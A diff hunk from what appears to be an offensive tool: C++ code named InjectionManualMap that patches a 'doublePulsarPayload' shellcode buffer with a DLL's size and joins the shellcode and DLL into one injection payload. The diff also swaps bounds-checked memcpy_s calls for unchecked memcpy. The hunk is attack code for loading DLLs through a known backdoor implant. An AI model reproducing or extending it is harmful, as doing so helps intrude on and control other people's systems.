@@ -15,11 +15,11 @@ std::vector<unsigned char> InjectionManualMap::ConstructPayload(std::vector<unsi
 	if (payload == nullptr) { return {}; }
 
 	// Edit shellcode to include dll size
-	memcpy_s(&doublePulsarPayload[0xF82], sizeof(doublePulsarPayload) - 0xF82, &dllSize, sizeof(dllSize));
+	memcpy(&doublePulsarPayload[0xF82], &dllSize, sizeof(dllSize));
 
 	// Put it all together, shellcode + DLL into the final buffer
-	memcpy_s(payload, payloadSize, doublePulsarPayload, sizeof(doublePulsarPayload));
-	memcpy_s(payload + sizeof(doublePulsarPayload), payloadSize - sizeof(doublePulsarPayload), dllBytes.data(), dllSize);
+	memcpy(payload, doublePulsarPayload, sizeof(doublePulsarPayload));
+	memcpy(payload + sizeof(doublePulsarPayload), dllBytes.data(), dllSize);
 
 	return std::vector<unsigned char>(payload, payload + payloadSize);
 }
